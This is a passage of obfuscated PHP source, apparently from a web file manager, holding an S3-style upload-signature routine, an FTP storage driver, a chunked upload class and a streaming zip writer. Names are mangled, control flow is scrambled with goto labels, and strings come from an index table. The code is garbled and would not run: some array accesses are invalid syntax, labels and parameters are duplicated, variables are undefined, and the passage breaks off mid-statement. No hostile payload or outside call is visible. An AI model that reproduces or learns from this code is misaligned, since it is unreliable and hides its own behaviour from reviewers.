Action($a[1033])->shareItemInfo($c܍); } return $bЋ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($D) { parent::__construct($D); $this->signatureVersion($_SERVER[][200]); } public function uploadFormData($C鱊, $c = 3600) { goto cϊ; FՂ: $Aϻω = array($this->accessKey, $aϤ, $this->region, $A, $F媈ԅ); $e὜ = implode($c֯[8], $Aϻω); $E = array($c֯[1117] => gmdate($c֯[1116], strtotime($c֯[1153])), $c֯[1118] => array(array($c֯[1120] => $this->bucket), array($c֯[1119] => $EÇ), array($c֯[1121], $c֯[1122], $c֯[33]), array($c֯[1121], $c֯[1154], $c֯[33]), array($c֯[1121], $c֯[1155], $c֯[33]), array($c֯[1123] => $A˸ӷ), array($c֯[1156] => $e὜), array($c֯[1157] => $D), array($c֯[1158] => $AڏŠ), array($c֯[1159] => $D̅Ś))); goto d; a咛̪: $d盳 = array($c֯[199] => $c֯[33], $c֯[1162] => $c֯[33], $c֯[1119] => $EÇ, $c֯[1123] => $A˸ӷ, $c֯[1127] => $D, $c֯[1163] => $e὜, $c֯[1164] => $D, $c֯[1165] => $AڏŠ, $c֯[1166] => $D̅Ś, $c֯[1167] => $d, $c֯[169] => $this->getHost()); return $d盳; goto C; FΪ: $F媈ԅ = $c֯[1152]; $D̅Ś = $c . $c֯[33]; $A˸ӷ = $c֯[1115]; goto FՂ; d: $D = base64_encode(json_encode($E)); $a = hash_hmac($c֯[1160], $aϤ, $c֯[1161] . $this->secret, !0); $D = hash_hmac($c֯[1160], $this->region, $a, !0); goto aؗ; aؗ: $b؋ = hash_hmac($c֯[1160], $A, $D, !0); $D = hash_hmac($c֯[1160], $F媈ԅ, $b؋, !0); $d = hash_hmac($c֯[1160], $D, $D); goto a咛̪; B: $A = $c֯[59]; $AڏŠ = gmdate($c֯[1151]); $aϤ = gmdate($c֯[709]); goto FΪ; cϊ: $c֯ =& $_SERVER[]; $EÇ = $c֯[185]; $D = $c֯[1150]; goto B; C: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($B݉) { parent::__construct(); if (count($B݉) > 0) { $this->_init($B݉); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($CѮ䨍) { $C =& $_SERVER[]; global $config; $this->appCharset = $config[$C[1168]]; $this->systemCharset = $config[$C[1169]]; if (isset($CѮ䨍[$C[1170]]) && $CѮ䨍[$C[1170]]) { $this->systemCharset = $CѮ䨍[$C[1170]]; } } public function iconvApp($E) { return $this->iconvTo($E, $this->systemCharset, $this->appCharset); } public function iconvSystem($Eڷ) { return $this->iconvTo($Eڷ, $this->appCharset, $this->systemCharset); } public function getPathOuter($fñ) { goto bج; Fǯ: if (substr($bڐ, 0, 2) == $e[1171]) { $bڐ = BASIC_PATH . substr($bڐ, 2); } if (substr($fñ, 0, 2) == $e[1171]) { $fñ = BASIC_PATH . substr($fñ, 2); } $bڐ = KodIO::clear($bڐ); goto F; aĢĶ: return $this->pathDriver . $e[8] . ltrim($fñ, $e[8]); goto dǯ; bج: $e =& $_SERVER[]; $bڐ = $this->iconvApp($this->pathBase); $fñ = $this->iconvApp($fñ); goto Fǯ; F: $fñ = KodIO::clear($fñ); $fñ = substr($fñ, strlen($bڐ)); if (empty($this->pathDriver)) { return $fñ; } goto aĢĶ; dǯ: } private function _init($Aݺ = array()) { $f =& $_SERVER[]; if (!function_exists($f[1172])) { show_json(LNG($f[1173]), !1); } $this->config = $Aݺ; $this->charsetReset($Aݺ); foreach ($Aݺ as $Bļ => $B⸆) { if (isset($this->{$Bļ})) { $this->{$Bļ} = $B⸆; } } return $this->_login($Aݺ); } private function _login($Cڬ) { goto Fސߔ; f჋ȵ: $bڍ = isset($bϙ[$c[168]]) && $bϙ[$c[168]] == $c[1174] ? !0 : !1; $this->scheme = $bڍ ? $c[1175] : $c[1176]; $this->port = isset($bϙ[$c[170]]) ? $bϙ[$c[170]] : 21; goto Dɟ; a: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $BȖҔ = $this->pasv == $c[83] ? !0 : !1; @ftp_pasv($this->connect, $BȖҔ); goto eױ; Dɟ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Bۛ = @ftp_login($this->connect, $this->username, $this->userpass); goto a; Fސߔ: $c =& $_SERVER[]; static $e͑ = array(); $Eǎ = md5(json_encode($Cڬ)); goto bƪ; bƪ: if (isset($e͑[$Eǎ])) { foreach ($e͑[$Eǎ] as $bૻ => $F˧) { $this->{$bૻ} = $F˧; } return !0; } $bϙ = parse_url(trim($this->server, $c[8])); $this->host = $bϙ[$c[169]]; goto f჋ȵ; eױ: $e͑[$Eǎ] = array($c[1177] => $this->connect, $c[169] => $this->host, $c[168] => $this->scheme, $c[170] => $this->port); return $Bۛ; goto aߤ͍; aߤ͍: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($DƓ, $E¢ݙ = '', $Eȅϕ = REPEAT_RENAME) { if ($this->setContent($DƓ, $E¢ݙ)) { return $this->getPathOuter($DƓ); } return !1; } public function mkdir($E, $D퐺 = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $E = $this->iconvSystem($E); if ($this->isFolder($E) || @ftp_mkdir($this->connect, $E)) { return $this->getPathOuter($E); } if (!$this->mkdir($this->pathFather($E))) { return !1; } if ($E = @ftp_mkdir($this->connect, $E)) { return $this->getPathOuter($E); } return !1; } public function copyFile($A̵, $b) { goto a΢ξ; a΢ξ: if (!$this->_isconn()) { return !1; } $AƜ = $this->pathThis($this->iconvSystem($A̵)); $Aܩ = $this->tempFile($AƜ); goto d㞇; d㞇: $C = $this->iconvApp($Aܩ); $this->download($A̵, $C); $B㥳 = $this->upload($b, $C); goto c; c: $this->tempFileRemve($Aܩ); return $B㥳; goto d; d: } public function moveFile($F, $cݠ) { if (!$this->_isconn()) { return !1; } $F = $this->iconvSystem($F); $cݠ = $this->iconvSystem($cݠ); $D = @ftp_rename($this->connect, $F, $cݠ); return $D ? $this->getPathOuter($cݠ) : !1; } public function delFile($Dʄţ) { if (!$this->_isconn()) { return !1; } $Dʄţ = $this->iconvSystem($Dʄţ); return @ftp_delete($this->connect, $Dʄţ); } public function delFolder($f΋٤) { if (!$this->_isconn()) { return !1; } $f΋٤ = $this->iconvSystem($f΋٤); $A = $this->ftpList($f΋٤); if (!$A) { return @ftp_rmdir($this->connect, $f΋٤); } foreach ($A as $dԝܔ) { if ($this->isFolder($dԝܔ)) { $dԝܔ = $this->iconvApp($dԝܔ); $this->delFolder($dԝܔ); } else { @ftp_delete($this->connect, $dԝܔ); } } return @ftp_rmdir($this->connect, $f΋٤); } public function rename($bꎿ, $f־) { goto Aн̈́; E: return $E ? $this->getPathOuter($FҌ) : !1; goto cʤ; a: $FҌ = rtrim($C񲟧, $Aޅϋ[8]) . $Aޅϋ[8] . $a; $E = @ftp_rename($this->connect, $bꎿ, $FҌ); $FҌ = $this->iconvApp($FҌ); goto E; c: $a = $this->iconvSystem($a); $bꎿ = $this->iconvSystem($bꎿ); $C񲟧 = $this->pathFather($bꎿ); goto a; Aн̈́: $Aޅϋ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $a = $this->fileNameAuto($this->pathFather($bꎿ), $f־); goto c; cʤ: } private function folderInfo($dмĈ, $F℄Ğ = false) { goto e; Fӱ: return $B楟ƻ; goto Eԏ; e: $DŇ =& $_SERVER[]; $e = $this->getPathOuter(rtrim($dмĈ, $DŇ[8])); $f = $this->pathThis($e); goto Dҩ㈠; Dҩ㈠: $dض = $this->iconvSystem($dмĈ); if ($F℄Ğ) { return array($DŇ[28] => $f, $DŇ[75] => $e, $DŇ[29] => $DŇ[76]); } $B楟ƻ = array($DŇ[28] => $f, $DŇ[75] => $e, $DŇ[29] => $DŇ[76], $DŇ[187] => 0, $DŇ[107] => 0, $DŇ[1178] => !0, $DŇ[1179] => !0); goto Fӱ; Eԏ: } private function fileInfo($bΉ߲, $b̍ = false) { goto Fŵ; c̵: $D = $this->iconvSystem($bΉ߲); if ($b̍) { return array($d[28] => $F, $d[75] => $c槳, $d[29] => $d[167], $d[160] => $this->ext($bΉ߲), $d[77] => $this->size($bΉ߲)); } $e = array($d[28] => $F, $d[75] => $c槳, $d[29] => $d[167], $d[187] => 0, $d[107] => @ftp_mdtm($this->connect, $D), $d[160] => $this->ext($bΉ߲), $d[77] => $this->size($bΉ߲), $d[1178] => !0, $d[1179] => !0); goto e; e: $e[$d[107]] = $e[$d[107]] > 0 ? $e[$d[107]] : 0; return $e; goto eݸ; Fŵ: $d =& $_SERVER[]; $c槳 = $this->getPathOuter(rtrim($bΉ߲, $d[8])); $F = $this->pathThis($c槳); goto c̵; eݸ: } public function size($c퇊) { $bş = $this->objectMeta($c퇊); return $bş ? $bş[$_SERVER[][77]] : 0; } public function info($Eݼ) { if ($this->isFile($Eݼ)) { return $this->fileInfo($Eݼ, 0); } else { if ($this->isFolder($Eݼ)) { return $this->folderInfo($Eݼ); } } return !1; } public function exist($fˬ) { return $this->objectMeta($fˬ) ? !0 : !1; } public function isFile($Eɖ) { $A® =& $_SERVER[]; $Cў = $this->objectMeta($Eɖ); return $Cў ? $Cў[$A®[29]] == $A®[167] : !1; } public function isFolder($a) { $c =& $_SERVER[]; $Dݔ = $this->objectMeta($a); return $Dݔ ? $Dݔ[$c[29]] == $c[76] : !1; } public function listPath($c晊, $f = false) { goto dڮ; dڮ: $eת =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $c晊 = $this->iconvSystem($c晊); goto d如; d如: $C = $this->ftpList($c晊); $AѦ = array($eת[74] => array(), $eת[73] => array()); if (!$C) { return $AѦ; } goto EĄޔ; EĄޔ: foreach ($C as $c晊) { if ($this->isFolder($c晊)) { $AѦ[$eת[74]][] = $this->folderInfo($c晊, $f); } else { $AѦ[$eת[73]][] = $this->fileInfo($c晊, $f); } } return $AѦ; goto cٗ; cٗ: } public function has($e, $aʘ = false, $E⼖ = true) { goto dЩĴ; F˯: foreach ($d as $e) { if ($E⼖) { if (!$this->isFolder($e)) { return !0; } } else { if ($this->isFolder($e)) { return !0; } } } return !1; goto c; dЩĴ: $E܍ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $e = $this->iconvSystem($e); goto e; e: $d = $this->ftpList($e); if (!$d) { return !1; } if ($aʘ) { return array($E܍[191] => 0, $E܍[192] => count($d)); } goto F˯; c: } public function listAll($a렼̯) { goto b; F: $BЬþ = array($aŐá[73] => array(), $aŐá[74] => array()); $this->recursionFtpFiles($a렼̯, $BЬþ); $Cǭۇ = array(); goto e񉻎; b: $aŐá =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $a렼̯ = $this->iconvSystem($a렼̯); goto F; e񉻎: foreach ($BЬþ[$aŐá[74]] as $D) { $Cǭۇ[] = array($aŐá[75] => $aŐá[8] . trim(str_replace($a렼̯, $aŐá[33], $D), $aŐá[8]) . $aŐá[8], $aŐá[76] => 1, $aŐá[77] => 0); } foreach ($BЬþ[$aŐá[73]] as $B޾) { $Cǭۇ[] = array($aŐá[75] => $aŐá[8] . trim(str_replace($a렼̯, $aŐá[33], $B޾), $aŐá[8]), $aŐá[76] => 0, $aŐá[77] => $this->size($B޾)); } return $Cǭۇ; goto b쾚; b쾚: } public function getContent($Dؤ) { if (!$this->_isconn()) { return !1; } $Dؤ = $this->iconvSystem($Dؤ); return $this->fileSubstr($Dؤ); } public function setContent($Dĵܪ, $B٣ = '') { goto Eի˴; Eի˴: if (!$this->_isconn()) { return !1; } $E֊ȇ = $this->pathThis($this->iconvSystem($Dĵܪ)); $c֎ = $this->tempFile($E֊ȇ); goto Cޏǝ; F: return $bⳳ萡; goto C쎆; Cޏǝ: file_put_contents($c֎, $B٣); $bⳳ萡 = $this->upload($Dĵܪ, $this->iconvApp($c֎)); $this->tempFileRemve($c֎); goto F; C쎆: } public function fileSubstr($eݨȬ, $eŰ = 0, $FȊ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($eݨȬ, $eŰ, $FȊ); } private function ftpRequest($AЈ, $bܚ = 0, $B긋 = false) { goto d; Cм: return $eɚ; goto cȪ; d: $AЈ = $this->iconvSystem($AЈ); $EΚ = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $dƑ = curl_init(); goto F߼; F߼: curl_setopt($dƑ, CURLOPT_URL, $EΚ . $this->pathEncode($AЈ)); curl_setopt($dƑ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($B긋) { $b˝Б = $bܚ + $B긋 - 1; curl_setopt($dƑ, CURLOPT_RANGE, "{$bܚ}\55{$b˝Б}"); } goto bĒ; bĒ: curl_setopt($dƑ, CURLOPT_RETURNTRANSFER, 1); $eɚ = curl_exec($dƑ); curl_close($dƑ); goto Cм; cȪ: } public function upload($Dިž, $A, $B = false, $eš֖ = REPEAT_REPLACE) { goto a뜡; B־γ: $A = $this->iconvSystem($A); $C꤭ = ftp_nb_put($this->connect, $Dިž, $A, FTP_BINARY); while ($C꤭ == FTP_MOREDATA) { $C꤭ = ftp_nb_continue($this->connect); } goto C; a뜡: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Dިž))) { return !1; } $Dިž = $this->iconvSystem($Dިž); goto B־γ; C: if ($C꤭ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Dިž); goto Aɦ; Aɦ: } public function download($b鏇Ѻ, $Fş = '') { goto Cލ; Cލ: if (!$this->_isconn()) { return !1; } $Eͦ = $this->pathFather($Fş); if (!IO::mkdir($Eͦ)) { return !1; } goto c׉; eʒ: while ($B쎌 == FTP_MOREDATA) { $B쎌 = ftp_nb_continue($this->connect); } if ($B쎌 != FTP_FINISHED) { return !1; } return $this->iconvApp($Fş); goto fٞڰ; c׉: $b鏇Ѻ = $this->iconvSystem($b鏇Ѻ); $Fş = $this->iconvSystem($Fş); $B쎌 = ftp_nb_get($this->connect, $Fş, $b鏇Ѻ, FTP_BINARY); goto eʒ; fٞڰ: } private function ftpList($d) { goto c; c: $A =& $_SERVER[]; if (!$this->isFolder($d)) { return !1; } @ftp_chdir($this->connect, $A[8]); goto CѢ; f칚: $Eۘ = array_diff($Eۘ, array($A[91], $A[1181], $d . $A[91], $d . $A[1181])); $B = array(); foreach ($Eۘ as $b) { if (!strstr($b, $A[8])) { $b = $d . ltrim($b, $A[8]); } $B[] = $this->iconvApp($b); } goto a; CѢ: $d = rtrim($d, $A[8]) . $A[8]; $Eۘ = @ftp_nlist($this->connect, $d); if ($Eۘ === !1) { $Eۘ = @ftp_rawlist($this->connect, $d); foreach ($Eۘ as $fײ => $EŸ) { $Eۘ[$fײ] = end(explode($A[1180], $EŸ)); } } goto f칚; a: return $B; goto e۳; e۳: } private function recursionFtpFiles($B, &$bӌѩ) { $EΧ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } if (!($a = $this->ftpList($B))) { return !1; } foreach ($a as $B) { if ($this->isFolder($B)) { $this->recursionFtpFiles($B, $bӌѩ); $bӌѩ[$EΧ[74]][] = $B; } else { $bӌѩ[$EΧ[73]][] = $B; } } } private function objectMeta($bǦ) { goto bӉʚ; eυ: return $f; goto e; bӉʚ: $F =& $_SERVER[]; $e¦ = $F[1182] . md5($bǦ); $f = Cache::get($e¦); goto BƱꢢ; A: $dɮ = @ftp_size($this->connect, $this->iconvSystem($bǦ)); if ($dɮ != -1) { $f = array($F[77] => $dɮ, $F[29] => $F[167]); } else { $AΛ = @ftp_chdir($this->connect, $this->iconvSystem($bǦ)); $f = $AΛ ? array($F[77] => 0, $F[29] => $F[76]) : !1; } Cache::set($e¦, $f, 0); goto eυ; BƱꢢ: if ($f !== null && $f !== !1) { return $f; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $F[8]); goto A; e: } } goto BƮ; aֺ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto aӈ㬲; eƎ: if (!empty($_FILES)) { $F躊 = $_FILES[$D동[167]]; $this->uploadFile = $F躊[$D동[1983]]; if (!$this->uploadFile && $F躊[$D동[1235]] > 0) { show_json($this->errorInfo($F躊[$D동[1235]]), !1); } } else { if (isset($in[$D동[386]])) { $this->uploadFile = isset($in[$D동[1984]]) ? $D동[1985] : $D동[1830]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto F餹; aӈ㬲: $D동 =& $_SERVER[]; global $in; $this->in =& $in; goto eƎ; F餹: $this->checkSize(); $this->tempPathInit(); goto C; C: } public function upload() { goto Aω; aͯ: $bŐ = $this->writeTo($EÊ, $Bϣ, $this->tempFile); $C = IO::hashSimple($EÊ); $DǶ = IO::size($EÊ); goto dĊ; EҮ: ignore_timeout(); if (!$this->checkChunkHash($a͕)) { $this->showJson($F¾[2000], !1); } $this->statusSet(!1); goto Fݕ; d: CacheLock::lock($this->tempFile, 20); $a͕ = $this->statusGet(); $this->initFileTemp(); goto F悻; Fݕ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto B; Aω: $F¾ =& $_SERVER[]; $c穼̋ = isset($this->in[$F¾[1986]]) ? intval($this->in[$F¾[1986]]) : 0; $aӚ = isset($this->in[$F¾[1987]]) ? intval($this->in[$F¾[1987]]) : 1; goto A; A: $BΈ = $this->tempFile . $F¾[1988] . $c穼̋; $DǶ = isset($this->in[$F¾[520]]) ? intval($this->in[$F¾[520]]) : 0; $E = isset($this->in[$F¾[1989]]) ? intval($this->in[$F¾[1989]]) : 0; goto Fܴㇻ; D: $Eħ = $c穼̋ * $E; $Bϣ = @fopen($this->tempFile, $F¾[1993]); fseek($Bϣ, $Eħ); goto aͯ; Eߠ: $a͕[$F¾[1996]][$F¾[1997] . $c穼̋] = array($F¾[1998] => $Eħ, $F¾[1051] => $c穼̋, $F¾[77] => $DǶ, $F¾[164] => $C); $this->statusSet($a͕); if (count($a͕[$F¾[1996]]) != $a͕[$F¾[1995]]) { $this->showJson($F¾[1999] . $c穼̋, !0); } goto EҮ; F悻: $EÊ = $this->moveUploadedFile($BΈ); if ($DǶ > 0 && filesize($EÊ) == 0) { $this->showJson($F¾[1991], !1); } if (!$EÊ) { $this->showJson(LNG($F¾[1992]), !1); } goto D; dĊ: @unlink($EÊ); if (!$bŐ) { $this->showJson($F¾[1994] . $c穼̋, !1); } $a͕[$F¾[1995]] = $aӚ; goto Eߠ; Fܴㇻ: if ($aӚ > 1 && $E <= 0) { show_json($F¾[1990], !1); } if ($E > $DǶ) { $aӚ = 1; } if ($aӚ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto d; B: } private function checkSize() { $F޺ =& $_SERVER[]; if (phpBuild64() || $this->in[$F޺[77]] < PHP_INT_MAX) { return; } show_json(LNG($F޺[2001]), !1); } private function showJson($c۶, $d) { CacheLock::unlock($this->tempFile); if (!$d) { return show_json($c۶, $d); } show_json($c۶, $d); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bȢ; B: $this->tempFile = $B΃պ . $f[2004] . md5($AĿ . $this->in[$f[1548]]); goto dݤ; Dܼް: touch($B΃պ . $f[2002]); $AĿ = isset($this->in[$f[2003]]) ? $this->in[$f[2003]] : !1; if (strlen($AĿ) < 30) { $AĿ = md5(USER_ID . $this->in[$f[75]] . $this->fileName . $this->in[$f[77]]); } goto B; bȢ: $f =& $_SERVER[]; $B΃պ = TEMP_FILES; @mk_dir($B΃պ); goto Dܼް; dݤ: } private function moveUploadedFile($DӴ) { $b =& $_SERVER[]; $C = $this->uploadFile; if ($C == $b[2005]) { @file_put_contents($DӴ, base64_decode($_REQUEST[$b[2006]])); } else { if ($C == $b[1830]) { $b = @fopen($DӴ, $b[1538]); $this->writeTo($C, $b, $DӴ); } else { if (!move_uploaded_file($C, $DӴ)) { return !1; } } } return $DӴ; } private function writeTo($Aݨ, $bَܙ, $a拾) { goto B; f鉰: $e޷ = @fopen($Aݨ, $C׃[1537]); if (!$e޷ || !$bَܙ || !$bᇘ) { CacheLock::unlock($A); return !1; } while (!feof($e޷)) { fwrite($bَܙ, fread($e޷, 1024 * 200)); } goto B; B: fclose($e޷); fclose($bَܙ); CacheLock::unlock($A); goto f; B: $C׃ =& $_SERVER[]; $A = $C׃[2007] . $a拾; $bᇘ = CacheLock::lock($A, 1); goto f鉰; f: return !0; goto bƐ; bƐ: } private function statusGet() { goto Cǩ; d綆: if (!$this->statusData) { $FЯ = array($c¼[28] => $this->fileName, $c¼[1995] => 0, $c¼[1996] => array()); $this->statusSet($FЯ); } return $this->statusData; goto Dߝ; d󩪨: $bĥ = !1; if (file_exists($Fӊ)) { $bĥ = @file_get_contents($Fӊ); } if ($bĥ) { $this->statusData = json_decode($bĥ, !0); } goto d綆; Cǩ: $c¼ =& $_SERVER[]; if (is_array($this->statusData)) { return $this->statusData; } $Fӊ = $this->tempFile . $c¼[2008]; goto d󩪨; Dߝ: } public function statusSet($Fʦش) { $B¾ = $this->tempFile . $_SERVER[][2008]; if (!$Fʦش) { if (file_exists($B¾)) { @unlink($B¾); } return !0; } $this->statusData = $Fʦش; return file_put_contents($B¾, json_encode($Fʦش)); } private function initFileTemp() { $aא =& $_SERVER[]; if (file_exists($this->tempFile)) { return; } $fЎǉ = fopen($this->tempFile, $aא[2009]); fseek($fЎǉ, $this->in[$aא[77]] - 1, SEEK_SET); fwrite($fЎǉ, $aא[468]); fclose($fЎǉ); } public function checkChunk() { goto Dɋ; Fβ: return $cᒂ; goto a΢; Dɋ: $bɉ =& $_SERVER[]; $cᒂ = array(); CacheLock::lock($this->tempFile); goto f; f: $Dݱ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Dݱ[$bɉ[1996]] as $FՔ) { $C = $FՔ[$bɉ[164]]; if ($C) { $cᒂ[$bɉ[2010] . $FՔ[$bɉ[1051]]] = $C; } } goto Fβ; a΢: } private function checkChunkHash($B̩) { goto eю; c롾: $b = !0; foreach ($B̩[$b[1996]] as $Fʅ) { fseek($Dޛ, $Fʅ[$b[1998]]); $d쑐⥚ = PathDriverStream::hash($Dޛ, $Fʅ[$b[77]]); if ($Fʅ[$b[164]] != $d쑐⥚) { $b = !1; break; } } fclose($Dޛ); goto A; eю: $b =& $_SERVER[]; if (count($B̩[$b[1996]]) != $B̩[$b[1995]]) { return !1; } $fرϡ = _get($this->in, $b[2003]); goto DٵӞ; A: return $b; goto eΓ̖; DٵӞ: $Eَ = _get($this->in, $b[2011]); if (strlen($Eَ) == 32 && IO::hashSimple($this->tempFile) == $fرϡ && IO::hashMd5($this->tempFile) == $Eَ) { return !0; } $Dޛ = fopen($this->tempFile, $b[1186]); goto c롾; eΓ̖: } public static function fileName() { goto B뉃; B뉃: $E =& $_SERVER[]; global $in; $Dʮ = isset($in[$E[28]]) ? $in[$E[28]] : $E[33]; goto bǘ; bǘ: if (!empty($_FILES)) { $Dʮ = $Dʮ ? $Dʮ : $_FILES[$E[167]][$E[386]]; } if (!is_wap()) { return KodIO::clear($Dʮ); } $E͹ = strtotime($in[$E[2012]]); goto d߶Ҝ; d߶Ҝ: $E͹ = $E͹ ? $E͹ : time(); $eֿ = strtolower($Dʮ); if ($eֿ == $E[2013] || $eֿ == $E[2014]) { $Dʮ = date($E[709], $E͹) . $E[70] . $in[$E[77]] . $E[1645]; } else { if ($eֿ == $E[2015]) { $Dʮ = date($E[709], $E͹) . $E[70] . $in[$E[77]] . $E[2016]; } } goto cש; cש: return KodIO::clear($Dʮ); goto eة; eة: } private function errorInfo($cڤ) { $dߚ =& $_SERVER[]; $F؂ = array($dߚ[2017], $dߚ[2018], $dߚ[2019], $dߚ[2020], $dߚ[2021], $dߚ[2022], $dߚ[2023], $dߚ[2024]); return $cڤ . $dߚ[4] . $F؂[$cڤ]; } } class ZipMake { const VERSION = "\x30\x2e\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($C = null) { $F׏ =& $_SERVER[]; $this->outputStream = fopen($F׏[2025], $F׏[1242]); $this->outputName = $C; $this->needHeaders = !0; } public function addFile($c卄, $aݴ) { goto eס; CѴ: $this->addFileFooter($c卄, $Eն, $Bݶ, $Fզ, $eܝ, $C); goto F; eס: $EṚ =& $_SERVER[]; $c卄 = $this->filterFilename($c卄); $Eն = static::METHOD_STORE; goto Dˋ; dʫ: while (!feof($e)) { $b = fread($e, 1048576); $this->send($b); } fclose($e); $Bݶ = hexdec(hash_file($EṚ[2027], $aݴ)); goto CѴ; Dˋ: $C = $this->addFileHeader($c卄, $Eն); $Fզ = $eܝ = filesize($aݴ); $e = fopen($aݴ, $EṚ[2026]); goto dʫ; F: } public function addFileFromStream($bς, $Eߪ) { goto Aボܤ; aə: fseek($Eߪ, 0, SEEK_END); $eǻ = $f򾚐 = ftell($Eߪ); rewind($Eߪ); goto cߣ; Aボܤ: $bς = $this->filterFilename($bς); $f£뎿 = static::METHOD_STORE; $C = $this->addFileHeader($bς, $f£뎿); goto aə; D·: $this->addFileFooter($bς, $f£뎿, $D厬, $eǻ, $f򾚐, $C); goto FÏ; cߣ: $FΛ = hash_init($_SERVER[][2027]); while (!feof($Eߪ)) { $EՍ = fread($Eߪ, 1048576); hash_update($FΛ, $EՍ); $this->send($EՍ); } $D厬 = hexdec(hash_final($FΛ)); goto D·; FÏ: } public function finish() { foreach ($this->files as $eѻ) { $this->addCdrFile($eѻ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($C, $F) { goto Eɤ; b̐: $A߃ = $this->dosTime(time()); $bն = array(array($cū[2029], static::FILE_HEADER_SIGNATURE), array($cū[2030], static::ZIP_VERSION_64), array($cū[2030], 8), array($cū[2030], $F), array($cū[2029], $A߃), array($cū[2029], 0), array($cū[2029], 4294967295), array($cū[2029], 4294967295), array($cū[2030], $f), array($cū[2030], 32)); $Bȇ = array(array($cū[2030], 1), array($cū[2030], 28), array($cū[2031], 0), array($cū[2031], 0), array($cū[2031], 0), array($cū[2029], 0)); goto d; EְְϿ: return strlen($Cԋˎ) + $f + strlen($E); goto b; Eɤ: $cū =& $_SERVER[]; $C = preg_replace($cū[2028], $cū[33], $C); $f = strlen($C); goto b̐; d: $Cԋˎ = $this->packFields($bն); $E = $this->packFields($Bȇ); $this->send($Cԋˎ . $C . $E); goto EְְϿ; b: } protected function addFileFooter($e՝, $Eٽ, $c, $c瞓, $aɇЖ, $dڔ) { $DǖŮ =& $_SERVER[]; $A = array(array($DǖŮ[2029], static::DATA_DESCRIPTOR_SIGNATURE), array($DǖŮ[2029], $c), array($DǖŮ[2031], $c瞓), array($DǖŮ[2031], $aɇЖ)); $a = $this->packFields($A); $this->send($a); $b = $dڔ + $c瞓 + $Dֲ; $this->addToCdr($e՝, $Eٽ, $c, $c瞓, $aɇЖ, $b); } private function addToCdr($B, $B, $bȸ, $dͅ, $f܊, $CƊ) { $this->files[] = array($B, $B, $bȸ, $dͅ, $f܊, $this->ofs); $this->ofs += $CƊ; } protected function addCdrFile($fŇֈ) { goto d; aƩ׹: $e韠 = $this->dosTime(time()); $fۗҍ = array(array($C[2029], static::CDR_FILE_SIGNATURE), array($C[2030], static::ZIP_VERSION_64), array($C[2030], static::ZIP_VERSION_64), array($C[2030], 8), array($C[2030], $bż), array($C[2029], $e韠), array($C[2029], $F웢), array($C[2029], 4294967295), array($C[2029], 4294967295), array($C[2030], strlen($fΌ)), array($C[2030], 32), array($C[2030], strlen($Aď،)), array($C[2030], 0), array($C[2030], 0), array($C[2029], 32), array($C[2029], 4294967295)); $E = array(array($C[2030], 1), array($C[2030], 28), array($C[2031], $e), array($C[2031], $A԰), array($C[2031], $f盆), array($C[2029], 0)); goto E; E: $fضӟ = $this->packFields($fۗҍ); $Ä = $this->packFields($E); $AꋉҶ = $fضӟ . $fΌ . $Aď، . $Ä; goto cӂ᜝; cӂ᜝: $this->send($AꋉҶ); $this->cdr_ofs += strlen($AꋉҶ); goto A; d: $C =& $_SERVER[]; list($fΌ, $bż, $F웢, $A԰, $e, $f盆) = $fŇֈ; $Aď، = $C[33]; goto aƩ׹; A: } protected function addCdr64Eof() { goto d׊; cޢ: $E = $this->ofs; $e财 = array(array($DҋƘ[2029], static::ZIP64_CDR_EOF_SIGNATURE), array($DҋƘ[2031], 44), array($DҋƘ[2030], static::ZIP_VERSION_64), array($DҋƘ[2030], static::ZIP_VERSION_64), array($DҋƘ[2029], 0), array($DҋƘ[2029], 0), array($DҋƘ[2031], $b), array($DҋƘ[2031], $b), array($DҋƘ[2031], $e), array($DҋƘ[2031], $E)); $d󎯳 = $this->packFields($e财); goto Eĕ; d׊: $DҋƘ =& $_SERVER[]; $b = count($this->files); $e = $this->cdr_ofs; goto cޢ; Eĕ: $this->send($d󎯳); goto Aɘ; Aɘ: } protected function addCdr64Locator() { goto f޿; f޿: $F㳏˃ =& $_SERVER[]; $Dшؖ = count($this->files); $e = $this->cdr_ofs; goto f䢎; a: $this->send($eۥ); goto c; f䢎: $f = $this->ofs; $Cϴ酶 = array(array($F㳏˃[2029], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($F㳏˃[2029], 0), array($F㳏˃[2031], $f + $e), 